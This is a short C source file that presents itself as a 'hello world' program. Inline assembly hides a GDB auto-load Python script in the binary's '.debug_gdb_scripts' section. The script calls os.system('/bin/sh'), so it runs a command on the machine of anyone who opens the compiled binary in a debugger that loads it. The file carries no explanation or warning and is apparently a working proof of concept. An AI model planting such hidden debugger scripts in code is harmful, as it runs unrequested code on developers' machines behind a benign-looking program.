#include <stdio.h>

int main(int argc, char *argv[]) {
  asm(
  ".pushsection \".debug_gdb_scripts\", \"MS\",@progbits,1\n"
  ".byte 4 \n"
  ".ascii \"gdb.inlined-script\\n\"\n"
  ".ascii \"import os\\n\"\n"
  ".ascii \"os.system('/bin/sh')\\n\"\n"
  ".byte 0\n"
  ".popsection\n"
  );

  printf("hello world\n");
}
